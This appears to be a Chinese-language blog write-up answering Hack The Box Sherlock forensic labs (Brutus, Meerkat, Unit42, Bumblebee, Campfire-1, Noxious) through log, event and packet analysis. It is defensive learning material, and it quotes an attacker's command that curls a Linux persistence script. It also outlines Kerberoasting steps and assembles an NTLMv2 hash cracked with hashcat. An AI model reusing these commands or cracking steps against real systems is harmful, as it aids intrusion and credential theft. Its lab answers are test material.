---
weight: 999
title: "Wp"
description: ""
icon: "article"
date: "2025-05-30T10:51:07+08:00"
lastmod: "2025-05-30T10:51:07+08:00"
draft: false
toc: true
---

解压密码为hacktheblue
# Brutus
>在这个非常简单的 Sherlock 任务中，您将熟悉 Unix 系统的 auth.log 和 wtmp 日志。我们将探讨一个 Confluence 服务器通过 SSH 服务遭受暴力破解的场景。攻击者获取服务器访问权限后，还进行了其他活动，这些都可以通过 auth.log 追踪。尽管 auth.log 主要用于暴力破解分析，但在本次调查中，我们将深入挖掘这一日志的全部潜力，包括权限提升、持久化攻击的迹象，甚至部分命令执行的可见性。

## Task1
>分析 auth.log 日志。攻击者用于实施暴力破解攻击的 IP 地址是什么？
>65.2.161.68


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423141308.png)

## Task2
>识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。
>root


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423141749.png)

## Task3
>识别攻击者手动登录服务器以执行其目标的时间戳。登录时间将与认证时间不同，可在 wtmp 记录中找到。
>2024-03-06 06:32:45

分析wtmp文件即可
## Task4
>SSH 登录会话在登录时会被跟踪并分配一个会话编号。攻击者针对问题 2 中用户账户的会话被分配了哪个会话编号？
>37


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423141749.png)

## Task5
>攻击者在服务器上添加了一个新用户作为其持久化策略的一部分，并赋予该新用户账户更高的权限。这个账户的名称是什么？
>cyberjunkie


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423143634.png)

## Task6
>用于通过创建新账户实现持久化的 MITRE ATT&CK 子技术 ID 是什么？
>T1136.001

技术为创建用户-本地用户
https://attack.mitre.org/techniques/T1136/
## Task7
>根据 auth.log，攻击者的第一次 SSH 会话何时结束？
>2024-03-06 06:37:24


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423144312.png)

## Task8
>攻击者登录其后门账户并利用其更高权限下载了一个脚本。使用 sudo 执行的具体完整命令是什么？
>/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423144414.png)


# Meerkat
>作为一家快速发展的初创公司，Forela 一直在使用业务管理平台。遗憾的是，我们的文档匮乏，且管理员的安全意识较为薄弱。作为新任安全服务提供商，我们希望您能查看我们导出的部分 PCAP 和日志数据，以确认我们是否遭受（或未遭受）入侵。

## Task1
>我们怀疑业务管理平台服务器可能已遭入侵。请确认当前运行的应用程序名称？
>Bonitasoft

wireshark-统计-端点-TCP-按照流量包大小排序

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423151029.png)

能看见一个外部地址发包最多，其次是内网地址的三个端口，猜测第一个为攻击者ip，8080为服务端口，过滤此端口
```wireshark
ip.dst==172.31.6.44 && tcp.port==8080
```
找到访问记录；

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423151259.png)

搜索得知软件名称

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423151354.png)

## Task2
>我们相信攻击者可能使用了暴力破解攻击类别的一个子集——所进行的攻击名称是什么？
>Credential Stuffing

按照info和time排序，找到爆破行为：

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423151607.png)

查看

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423151634.png)


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423151659.png)

不像是暴力，更像是撞库
## Task3
>被利用的漏洞是否分配有 CVE 编号？如果有，是哪一个？
>CVE-2022-25237

能看见访问了这个路由

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423152321.png)

搜索得到编号，[CVE-2022-25237](https://zhuanlan.zhihu.com/p/575580483)

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423152441.png)

## Task4
>攻击者的漏洞利用在 API URL 路径后附加了哪个字符串以绕过授权过滤器？
>i18ntranslation

参见上一问即可
## Task5
>在凭证填充攻击中使用了多少组用户名和密码的组合？
>56

文件-导出分组解析结果为纯文本，用脚本提取即可
```python
import re

def extract_usernames(filename):
    pattern = r'Form item: "username"\s*=\s*"([^"]+)"'
    usernames = []
    
    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
            match = re.search(pattern, line)
            if match:
                usernames.append(match.group(1))
    
    return usernames

# 使用示例
usernames = extract_usernames('1.txt')
usernames = set(usernames)
print(len(usernames))
for i in usernames:
	print(i)
```
得到结果57，但是不对，去掉默认账户`install:install`就对了
## Task6
>哪一组用户名和密码组合成功了？
>`seb.broom@forela.co.uk:g0vernm3nt`

过滤响应码200的包
```wireshark
ip.addr == 172.31.6.44 && tcp.port == 8080 && http.response.code == 200
```

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423162024.png)

## Task7
>如果有的话，攻击者利用了哪个文本分享网站？
>pastes.io


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423162751.png)

## Task8
>请提供攻击者用于在我们主机上维持持久访问的公钥文件名。
>hffgra4unv

题目翻译的有点问题，意思应该是用哪个文件写入的公钥
打开上一题找到的url能看见

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423163628.png)


## Task9
>你能确认攻击者为维持持久访问所修改的文件吗？
>/home/ubuntu/.ssh/authorized_keys

见上一题
## Task10
>您能确认这种持久化机制对应的 MITRE 技术 ID 吗？
>T1098.004


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250423164013.png)


# Unit42
附件是一个evtx文件，windows事件查看器能直接打开
附上sysmon事件id表

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428154637.png)

## Task1
>事件 ID 为 11 的日志记录共有多少条？
>56

筛选就能知道

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428153541.png)

## Task2
>每当在内存中创建一个进程时，都会记录一个事件 ID 为 1 的事件，其中包含命令行、哈希值、进程路径、父进程路径等详细信息。这些信息对分析师非常有用，因为它允许我们查看系统上执行的所有程序，这意味着我们可以发现任何正在执行的恶意进程。受害者系统感染的恶意进程是什么？
>C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe

过滤id位1的事件，第二个的程序不正常

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428153748.png)

## Task3
>哪种云盘被用来分发恶意软件？
>dropbox

查表，22是dns查询，翻id为22的事件，找到一个特殊域名

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428154712.png)

确认是云盘

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428154739.png)

## Task4
>对于许多写入磁盘的文件，初始恶意文件采用了一种名为“时间戳伪造”的防御规避技术，即更改文件创建日期使其显得更旧，从而与其他文件混为一体。PDF 文件的时间戳被修改为何时？
>2024-01-14 08:10:06.029

过滤事件id=2，搜索pdf

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428184303.png)

日志是2-14号的，做旧就是1-14了
## Task5
>恶意文件在磁盘上释放了几个文件。"once.cmd"是在磁盘的哪个位置创建的？请提供包含文件名的完整路径作为答案。

过滤事件id=11，搜索once.cmd

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428184527.png)

## Task6
>该恶意文件尝试连接一个虚拟域名，很可能是为了检测网络连接状态。它试图连接的域名是什么？
>www.example.com

域名和dns有关，过滤事件22

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428185000.png)

## Task7
>恶意进程试图连接的 IP 地址是哪个？
>93.184.216.34

过滤事件3

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428185049.png)

## Task8
>恶意进程在感染 PC 后自行终止，该 PC 被植入了 UltraVNC 的后门变种。该进程是何时自行终止的？
>2024-02-14 03:41:58

过滤进程5

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428185217.png)



# Bumblebee
>一名外部承包商通过访客 Wi-Fi 访问了 Forela 的内部论坛，并且似乎窃取了管理员用户的凭证！我们附上了一些论坛日志和完整的 sqlite3 格式数据库转储文件，以协助您的调查。

## Task1
>该外部承包商的用户名是什么？
>apoole

提示结尾有个1，在数据库50多项有俩，试了一下第二个是

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428191411.png)

## Task2
>承包商使用哪个 IP 地址创建了他们的账户？
>10.10.0.78


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428192203.png)

## Task3
>承包商发布的恶意帖子的 post_id 是什么？
>9

phpbb_posts数据库里找


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428192406.png)

## Task4
>凭证窃取程序发送数据的完整 URI 是什么
>http://10.10.0.78/update.php

上一题的posts内容复制本地html打开，login标签找到

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428193338.png)

## Task5
>承包商何时以管理员身份登录论坛？（UTC 时间
>26/04/2023 10:53:12

在phpbb_log找到管理员登录记录，在最后

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428194455.png)

登录操作为post，过滤找到最底下的记录

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428194531.png)

第一个应该就是登录记录26/Apr/2023:11:53:12 +0100，转换成UTC时间减一即可
## Task6
>论坛中有 LDAP 连接的明文凭证，密码是什么？
>Passw0rd1

在phpbb_config里面找到

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428195337.png)

## Task7
>管理员用户的 User Agent 是什么？
>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36

找时间靠前的adm访问记录即可

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428195520.png)

## Task8
>承包商何时将自己加入管理员组？（UTC 时间
>26/04/2023 10:53:51

log数据库找到

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428195720.png)

## Task9
>承包商在什么时间下载了数据库备份？（UTC 时间）
>26/04/2023 11:01:38

日志搜backup，能找到get一个gz

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250428200348.png)

## Task10
>根据 access.log 记录，数据库备份的大小是多少字节？
>34707

和上一题一个位置

# Campfire-1
## Task1
>分析域控制器安全日志，您能否确认发生 Kerberoasting 攻击的具体日期和时间？

这种攻击方式的流程为：
1. 发现SPN服务  
2. 使用工具向 SPN 请求 TGS 票据  
3. 转储 .kirbi 或 ccache 或服务 HASH 的 TGS 票据  
4. 将 .kirbi 或 ccache 文件转换为可破解格式  
5. 使用hashcat等工具配合字典进行暴力破解
也就是要请求tgs票据，id为4769的日志记录此事件

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250525192813.png)

翻找发现mysql服务，别的都是域控服务，大概率就是这个

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250525193845.png)

转化为utc+0时间
2024-05-21 3:18:09
## Task2
>被攻击的服务名称是什么？

见上一题
MSSQLService
## Task3
>识别发生此活动的工作站至关重要。该工作站的 IP 地址是什么？

见上一题，日志里有客户端地址
172.17.79.129
## Task4
>既然我们已经定位到该工作站，现为您提供包括 PowerShell 日志和预取文件在内的诊断数据，以便深入分析，从而了解该端点上的活动是如何发生的。用于枚举 Active Directory 对象并可能在网络中查找可 Kerberoast 账户的文件名称是什么？

打开powershell日志，4104为执行命令，依次翻找，找到绕过限制执行ps文件

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250525194419.png)

那下一条应该就是具体的文件位置

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250525194448.png)

找到文件路径
powerview.ps1
## Task5
>该脚本是何时执行的？

见上一题时间，转为utc-0
2024-05-21 03:16:32
## Task6
>用于执行实际 kerberoasting 攻击的工具完整路径是什么？

>prefetch文件夹
Windows 中的预读取文件夹，存放系统已访问的文件的预读信息，程序首次运行时会存储有关在加载该文件时访问的所有文件的信息，还存储元数据

工具采集信息在11:17:25结束，从17分开始查看prefetch文件夹

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250525195207.png)

可疑程序rubeus.exe
使用[PECmd](https://ericzimmerman.github.io/#!index.md)读取

```bash
PECmd.exe -f "C:\Users\xxx\Downloads\Triage\Workstation\2024-05-21T033012_triage_asset\C\Windows\prefetch\RUBEUS.EXE-5873E24B.pf" --csv "./"
```


![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250525195859.png)


C:\Users\Alonzo.spire\Downloads\Rubeus.exe
## Task7
>该工具是何时执行以转储凭据的？

表格有最后运行时间
2024-05-21 03:18:08

# Noxious
>入侵检测系统（IDS）设备发出警报，提示内部 Active Directory 网络中可能存在恶意设备。该系统还监测到异常的 LLMNR 协议流量，怀疑发生了 LLMNR 投毒攻击。异常流量指向 IP 地址为 172.17.79.136 的 Forela-WKstn002 工作站。作为网络取证专家，您已获得事发时段的部分数据包捕获文件。鉴于事件发生在 Active Directory 虚拟局域网内，建议结合 AD 攻击向量开展网络威胁狩猎，重点关注 LLMNR 投毒攻击。
## Task1
>安全团队怀疑 Forela 内网中存在运行 Responder 工具的恶意设备实施 LLMNR 投毒攻击。请定位该恶意设备的 IP 地址。

LLMNR协议在UDP 5355，所以过滤`udp.port==5355`

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528102606.png)

能看到`172.17.79.135`对工作站`172.17.79.136`的LLMNR查询进行了回应，冒充了dc
答案就是172.17.79.135
## Task2
>被入侵机器的主机名是什么？

过滤此ip，`ip.addr==172.17.79.135`，有一个dhcp请求分配动态ip，里面有主机名称

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528104229.png)


答案是kali
## Task3
>现在我们需要确认攻击者是否获取了用户哈希值且该哈希可被破解！！被捕获哈希的用户名是什么？

还是过滤上面的ip，有一条登录cookie数据包，说明攻击者成功破解密码并破解

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528104639.png)


答案是john.deacon
## Task4
>在 NTLM 流量中可以看到受害者的凭证被多次中继到攻击者的机器上。这些哈希值首次是在何时被捕获的？

ntml协议通常使用HTTP、SMB、SMTP，查看协议占比可知smb2占比最多

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528110259.png)

过滤smb2协议
搜索dcc01，能找到工作站请求NTLM认证。从这里开始进行中间人劫持哈希。

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528110555.png)

答案是2024-06-24 11:18:30（ 注意是 UTC-0）
## Task5
>受害者在访问文件共享时输入了哪个拼写错误导致其凭据泄露？

task1可以看到请求了很多次dcc01
DCC01
## Task6
>要获取受害用户的实际凭据，我们需要将 NTLM 协商数据包中的多个值拼接起来。NTLM 服务器质询值是多少？

查看这个包，9291，他进行了第一次ntml challenge，是攻击者转发的流量

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528111930.png)

找到答案

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528112031.png)

答案：601019d191f054f1
## Task7
>现在执行类似操作，找到 NTProofStr 的值。

下一个客户端回复包就有

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528112507.png)

答案：c0cc803a6d9fb5a9082253a04dbd4cd4
## Task8
>要测试密码复杂度，可尝试从数据包捕获的信息中恢复密码。这是关键步骤，通过这种方式我们能发现攻击者是否成功破解密码以及破解速度。

组建一个html哈希需要以下几个要素
- 用户名：john.deacon
- 域名：FORELA
- server challenge：601019d191f054f1
- NTproofstring：c0cc803a6d9fb5a9082253a04dbd4cd4
- NTLMv2回复：去掉NTproofstring

```ntml
john.deacon::FORELA:601019d191f054f1:c0cc803a6d9fb5a9082253a04dbd4cd4:010100000000000080e4d59406c6da01cc3dcfc0de9b5f2600000000020008004e0042004600590001001e00570049004e002d00360036004100530035004c003100470052005700540004003400570049004e002d00360036004100530035004c00310047005200570054002e004e004200460059002e004c004f00430041004c00030014004e004200460059002e004c004f00430041004c00050014004e004200460059002e004c004f00430041004c000700080080e4d59406c6da0106000400020000000800300030000000000000000000000000200000eb2ecbc5200a40b89ad5831abf821f4f20a2c7f352283a35600377e1f294f1c90a001000000000000000000000000000000000000900140063006900660073002f00440043004300300031000000000000000000
```
然后使用hashcat破解
```bash
hashcat 2 /usr/share/wordlists/rockyou.txt -m 5600 --force
```

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528113840.png)

得到答案：`NotMyPassword0k?`
## Task9
>为了更全面地了解事件背景，受害者当时试图访问的具体文件共享是什么？

第一个访问的共享文件夹

![](https://m1st0rybucket.oss-cn-beijing.aliyuncs.com/pic/Pasted%20image%2020250528112926.png)

`\\DC01\DC-Confidential`

参考文章：[0xdf/HTB Sherlock: Noxious](https://0xdf.gitlab.io/2024/09/04/htb-sherlock-noxious.html)
